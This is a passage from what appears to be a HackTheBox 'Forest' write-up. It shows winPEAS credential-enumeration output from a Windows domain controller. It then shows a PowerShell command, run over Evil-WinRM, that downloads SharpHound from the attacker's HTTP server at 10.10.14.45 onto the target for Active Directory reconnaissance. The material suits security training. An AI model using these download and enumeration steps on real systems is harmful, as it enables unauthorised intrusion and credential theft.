  UDP        [::]                                        63035         *:*                            1924              dns
  UDP        [::]                                        63036         *:*                            1924              dns
  UDP        [::]                                        63037         *:*                            1924              dns
  UDP        [::]                                        63038         *:*                            1924              dns
  UDP        [::]                                        63039         *:*                            1924              dns
  UDP        [::]                                        63040         *:*                            1924              dns
  UDP        [::]                                        63041         *:*                            1924              dns
  UDP        [::]                                        63042         *:*                            1924              dns
  UDP        [::]                                        63043         *:*                            1924              dns
  UDP        [::]                                        63044         *:*                            1924              dns
  UDP        [::]                                        63045         *:*                            1924              dns
  UDP        [::]                                        63046         *:*                            1924              dns
  UDP        [::]                                        63047         *:*                            1924              dns
  UDP        [::]                                        63048         *:*                            1924              dns
  UDP        [::]                                        63049         *:*                            1924              dns
  UDP        [::]                                        63050         *:*                            1924              dns
  UDP        [::]                                        63051         *:*                            1924              dns
  UDP        [::]                                        63052         *:*                            1924              dns
  UDP        [::]                                        63053         *:*                            1924              dns
  UDP        [::]                                        63054         *:*                            1924              dns
  UDP        [::]                                        63055         *:*                            1924              dns
  UDP        [::]                                        63056         *:*                            1924              dns
  UDP        [::]                                        63057         *:*                            1924              dns
  UDP        [::]                                        63058         *:*                            1924              dns
  UDP        [::]                                        63059         *:*                            1924              dns
  UDP        [::]                                        63060         *:*                            1924              dns
  UDP        [::]                                        63061         *:*                            1924              dns
  UDP        [::]                                        63062         *:*                            1924              dns
  UDP        [::]                                        63063         *:*                            1924              dns
  UDP        [::]                                        63064         *:*                            1924              dns
  UDP        [::]                                        63065         *:*                            1924              dns
  UDP        [::]                                        63066         *:*                            1924              dns
  UDP        [::]                                        63067         *:*                            1924              dns
  UDP        [::]                                        63068         *:*                            1924              dns
  UDP        [::]                                        63069         *:*                            1924              dns
  UDP        [::]                                        63070         *:*                            1924              dns
  UDP        [::]                                        63071         *:*                            1924              dns
  UDP        [::]                                        63072         *:*                            1924              dns
  UDP        [::]                                        63073         *:*                            1924              dns
  UDP        [::]                                        63074         *:*                            1924              dns
  UDP        [::]                                        63075         *:*                            1924              dns
  UDP        [::]                                        63076         *:*                            1924              dns
  UDP        [::]                                        63077         *:*                            1924              dns
  UDP        [::]                                        63078         *:*                            1924              dns
  UDP        [::]                                        63079         *:*                            1924              dns
  UDP        [::]                                        63080         *:*                            1924              dns
  UDP        [::]                                        63081         *:*                            1924              dns
  UDP        [::]                                        63082         *:*                            1924              dns
  UDP        [::]                                        63083         *:*                            1924              dns
  UDP        [::]                                        63084         *:*                            1924              dns
  UDP        [::]                                        63085         *:*                            1924              dns
  UDP        [::]                                        63086         *:*                            1924              dns
  UDP        [::]                                        63087         *:*                            1924              dns
  UDP        [::]                                        63088         *:*                            1924              dns
  UDP        [::]                                        63089         *:*                            1924              dns
  UDP        [::]                                        63090         *:*                            1924              dns
  UDP        [::]                                        63091         *:*                            1924              dns
  UDP        [::]                                        63092         *:*                            1924              dns
  UDP        [::]                                        63093         *:*                            1924              dns
  UDP        [::]                                        63094         *:*                            1924              dns
  UDP        [::]                                        63095         *:*                            1924              dns
  UDP        [::]                                        63096         *:*                            1924              dns
  UDP        [::]                                        63097         *:*                            1924              dns
  UDP        [::]                                        63098         *:*                            1924              dns
  UDP        [::]                                        63099         *:*                            1924              dns
  UDP        [::]                                        63100         *:*                            1924              dns
  UDP        [::]                                        63101         *:*                            1924              dns
  UDP        [::]                                        63102         *:*                            1924              dns
  UDP        [::]                                        63103         *:*                            1924              dns
  UDP        [::]                                        63104         *:*                            1924              dns
  UDP        [::]                                        63105         *:*                            1924              dns
  UDP        [::]                                        63106         *:*                            1924              dns
  UDP        [::]                                        63107         *:*                            1924              dns
  UDP        [::]                                        63108         *:*                            1924              dns
  UDP        [::]                                        63109         *:*                            1924              dns
  UDP        [::]                                        63110         *:*                            1924              dns
  UDP        [::]                                        63111         *:*                            1924              dns
  UDP        [::]                                        63112         *:*                            1924              dns
  UDP        [::]                                        63113         *:*                            1924              dns
  UDP        [::]                                        63114         *:*                            1924              dns
  UDP        [::]                                        63115         *:*                            1924              dns
  UDP        [::]                                        63116         *:*                            1924              dns
  UDP        [::]                                        63117         *:*                            1924              dns
  UDP        [::]                                        63118         *:*                            1924              dns
  UDP        [::]                                        63119         *:*                            1924              dns
  UDP        [::]                                        63120         *:*                            1924              dns
  UDP        [::]                                        63121         *:*                            1924              dns
  UDP        [::]                                        63122         *:*                            1924              dns
  UDP        [::]                                        63123         *:*                            1924              dns
  UDP        [::]                                        63124         *:*                            1924              dns
  UDP        [::]                                        63125         *:*                            1924              dns
  UDP        [::]                                        63126         *:*                            1924              dns
  UDP        [::]                                        63127         *:*                            1924              dns
  UDP        [::]                                        63128         *:*                            1924              dns
  UDP        [::]                                        63129         *:*                            1924              dns
  UDP        [::]                                        63130         *:*                            1924              dns
  UDP        [::]                                        63131         *:*                            1924              dns
  UDP        [::]                                        63132         *:*                            1924              dns
  UDP        [::]                                        63133         *:*                            1924              dns
  UDP        [::]                                        63134         *:*                            1924              dns
  UDP        [::]                                        63135         *:*                            1924              dns
  UDP        [::]                                        63136         *:*                            1924              dns
  UDP        [::]                                        63137         *:*                            1924              dns
  UDP        [::]                                        63138         *:*                            1924              dns
  UDP        [::]                                        63139         *:*                            1924              dns
  UDP        [::]                                        63140         *:*                            1924              dns
  UDP        [::]                                        63141         *:*                            1924              dns
  UDP        [::]                                        63142         *:*                            1924              dns
  UDP        [::]                                        63143         *:*                            1924              dns
  UDP        [::]                                        63144         *:*                            1924              dns
  UDP        [::]                                        63145         *:*                            1924              dns
  UDP        [::]                                        63146         *:*                            1924              dns
  UDP        [::]                                        63147         *:*                            1924              dns
  UDP        [::]                                        63148         *:*                            1924              dns
  UDP        [::]                                        63149         *:*                            1924              dns
  UDP        [::]                                        63150         *:*                            1924              dns
  UDP        [::]                                        63151         *:*                            1924              dns
  UDP        [::]                                        63152         *:*                            1924              dns
  UDP        [::]                                        63153         *:*                            1924              dns
  UDP        [::]                                        63154         *:*                            1924              dns
  UDP        [::]                                        63155         *:*                            1924              dns
  UDP        [::]                                        63156         *:*                            1924              dns
  UDP        [::]                                        63157         *:*                            1924              dns
  UDP        [::]                                        63158         *:*                            1924              dns
  UDP        [::]                                        63159         *:*                            1924              dns
  UDP        [::]                                        63160         *:*                            1924              dns
  UDP        [::]                                        63161         *:*                            1924              dns
  UDP        [::]                                        63162         *:*                            1924              dns
  UDP        [::]                                        63163         *:*                            1924              dns
  UDP        [::]                                        63164         *:*                            1924              dns
  UDP        [::]                                        63165         *:*                            1924              dns
  UDP        [::]                                        63166         *:*                            1924              dns
  UDP        [::]                                        63167         *:*                            1924              dns
  UDP        [::]                                        63168         *:*                            1924              dns
  UDP        [::]                                        63169         *:*                            1924              dns
  UDP        [::]                                        63170         *:*                            1924              dns
  UDP        [::]                                        63171         *:*                            1924              dns
  UDP        [::]                                        63172         *:*                            1924              dns
  UDP        [::]                                        63173         *:*                            1924              dns
  UDP        [::]                                        63174         *:*                            1924              dns
  UDP        [::]                                        63175         *:*                            1924              dns
  UDP        [::]                                        63176         *:*                            1924              dns
  UDP        [::]                                        63177         *:*                            1924              dns
  UDP        [::]                                        63178         *:*                            1924              dns
  UDP        [::]                                        63179         *:*                            1924              dns
  UDP        [::]                                        63180         *:*                            1924              dns
  UDP        [::]                                        63181         *:*                            1924              dns
  UDP        [::]                                        63182         *:*                            1924              dns
  UDP        [::]                                        63183         *:*                            1924              dns
  UDP        [::]                                        63184         *:*                            1924              dns
  UDP        [::]                                        63185         *:*                            1924              dns
  UDP        [::]                                        63186         *:*                            1924              dns
  UDP        [::]                                        63187         *:*                            1924              dns
  UDP        [::]                                        63188         *:*                            1924              dns
  UDP        [::]                                        63189         *:*                            1924              dns
  UDP        [::]                                        63190         *:*                            1924              dns
  UDP        [::]                                        63191         *:*                            1924              dns
  UDP        [::]                                        63192         *:*                            1924              dns
  UDP        [::]                                        63193         *:*                            1924              dns
  UDP        [::]                                        63194         *:*                            1924              dns
  UDP        [::]                                        63195         *:*                            1924              dns
  UDP        [::]                                        63196         *:*                            1924              dns
  UDP        [::]                                        63197         *:*                            1924              dns
  UDP        [::]                                        63198         *:*                            1924              dns
  UDP        [::]                                        63199         *:*                            1924              dns
  UDP        [::]                                        63200         *:*                            1924              dns
  UDP        [::]                                        63201         *:*                            1924              dns
  UDP        [::]                                        63202         *:*                            1924              dns
  UDP        [::]                                        63203         *:*                            1924              dns
  UDP        [::]                                        63204         *:*                            1924              dns
  UDP        [::]                                        63205         *:*                            1924              dns
  UDP        [::]                                        63206         *:*                            1924              dns
  UDP        [::]                                        63207         *:*                            1924              dns
  UDP        [::]                                        63208         *:*                            1924              dns
  UDP        [::]                                        63209         *:*                            1924              dns
  UDP        [::]                                        63210         *:*                            1924              dns
  UDP        [::]                                        63211         *:*                            1924              dns
  UDP        [::]                                        63212         *:*                            1924              dns
  UDP        [::]                                        63213         *:*                            1924              dns
  UDP        [::]                                        63214         *:*                            1924              dns
  UDP        [::]                                        63215         *:*                            1924              dns
  UDP        [::]                                        63216         *:*                            1924              dns
  UDP        [::]                                        63217         *:*                            1924              dns
  UDP        [::]                                        63218         *:*                            1924              dns
  UDP        [::]                                        63219         *:*                            1924              dns
  UDP        [::]                                        63220         *:*                            1924              dns
  UDP        [::]                                        63221         *:*                            1924              dns
  UDP        [::]                                        63222         *:*                            1924              dns
  UDP        [::]                                        63223         *:*                            1924              dns
  UDP        [::]                                        63224         *:*                            1924              dns
  UDP        [::]                                        63225         *:*                            1924              dns
  UDP        [::]                                        63226         *:*                            1924              dns
  UDP        [::]                                        63227         *:*                            1924              dns
  UDP        [::]                                        63228         *:*                            1924              dns
  UDP        [::]                                        63229         *:*                            1924              dns
  UDP        [::]                                        63230         *:*                            1924              dns
  UDP        [::]                                        63231         *:*                            1924              dns
  UDP        [::]                                        63232         *:*                            1924              dns
  UDP        [::]                                        63233         *:*                            1924              dns
  UDP        [::]                                        63234         *:*                            1924              dns
  UDP        [::]                                        63235         *:*                            1924              dns
  UDP        [::]                                        63236         *:*                            1924              dns
  UDP        [::]                                        63237         *:*                            1924              dns
  UDP        [::]                                        63238         *:*                            1924              dns
  UDP        [::]                                        63239         *:*                            1924              dns
  UDP        [::]                                        63240         *:*                            1924              dns
  UDP        [::]                                        63241         *:*                            1924              dns
  UDP        [::]                                        63242         *:*                            1924              dns
  UDP        [::]                                        63243         *:*                            1924              dns
  UDP        [::]                                        63244         *:*                            1924              dns
  UDP        [::]                                        63245         *:*                            1924              dns
  UDP        [::]                                        63246         *:*                            1924              dns
  UDP        [::]                                        63247         *:*                            1924              dns
  UDP        [::]                                        63248         *:*                            1924              dns
  UDP        [::]                                        63249         *:*                            1924              dns
  UDP        [::]                                        63250         *:*                            1924              dns
  UDP        [::]                                        63251         *:*                            1924              dns
  UDP        [::]                                        63252         *:*                            1924              dns
  UDP        [::]                                        63253         *:*                            1924              dns
  UDP        [::]                                        63254         *:*                            1924              dns
  UDP        [::]                                        63255         *:*                            1924              dns
  UDP        [::]                                        63256         *:*                            1924              dns
  UDP        [::]                                        63257         *:*                            1924              dns
  UDP        [::]                                        63258         *:*                            1924              dns
  UDP        [::]                                        63259         *:*                            1924              dns
  UDP        [::]                                        63260         *:*                            1924              dns
  UDP        [::]                                        63264         *:*                            1924              dns
  UDP        [::1]                                       53            *:*                            1924              dns
  UDP        [::1]                                       51870         *:*                            1924              dns
  UDP        [fe80::2c44:2c0f:6f9d:160b%5]               53            *:*                            1924              dns
  UDP        [fe80::2c44:2c0f:6f9d:160b%5]               88            *:*                            580               lsass
  UDP        [fe80::2c44:2c0f:6f9d:160b%5]               464           *:*                            580               lsass

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        EnablePunycode                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run:
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d535350000300000001000100640000000000000065000000000000005800000000000000580000000c000c00580000000000000065000000058a80a20a0039380000000f9627a76d566adeb3cf206b6282d11a9646004f00520045005300540000


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-3072663084-364016917-1341370565-1147
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)

  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\temp\winPEASx64.exe": svc-alfresco [AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing MariaDB Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing PostgreSQL Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Apache Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing PHP Sessions Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Wordpress Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Drupal Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Moodle Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Tomcat Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Mongo Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Supervisord Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Cesi Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Rsync Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Hostapd Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Anaconda ks Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Racoon Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing VNC Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Ldap Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing OpenVPN Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing SSH Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Cloud Credentials Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Kibana Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Knockd Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Elasticsearch Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing CouchDB Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Redis Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Mosquitto Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Neo4j Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Cloud Init Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Erlang Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing GMV Auth Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing IPSec Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing IRSSI Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Keyring Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Filezilla Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Backup Manager Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing PGP-GPG Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing FastCGI Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing SNMP Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Pypirc Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Postfix Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing CloudFlare Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Http_conf Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Htpasswd Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Ldaprc Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Env Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Msmtprc Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Github Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Svn Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Keepass Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing FTP Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Bind Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing SeedDMS Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Ddclient Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Sentry Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Strapi Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Cacti Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Interesting logs Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Other Interesting Files Files (limit 70)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Windows Files Files (limit 70)
    C:\Users\Default\NTUSER.DAT
    C:\Users\svc-alfresco\NTUSER.DAT

ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Other Windows Files Files (limit 70)

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/
```

ah shit here we go again! long ass results again...
well, it leaks user groups 
lets run bloodhound to see if theres any exploitable paths
first in the box download the sharphound exe 
using the following commands

```
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ────────────────────────────────────────────────────────────────────────────────────────────────────── 1 ✘  at 08:55:54 
╰─ sudo python -m SimpleHTTPServer 8080 
Serving HTTP on 0.0.0.0 port 8080 ...
```
execute this cmd in the directory where u saved the sharphound.exe

and run the following on the target machine 
```*Evil-WinRM* PS C:\temp> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.45:8080/SharpHound.exe', 'C:\temp\SharpHound.exe')
```

and now run it!

```
*Evil-WinRM* PS C:\temp> ./SharpHound.exe
----------------------------------------------
Initializing SharpHound at 3:40 AM on 9/5/2021
----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
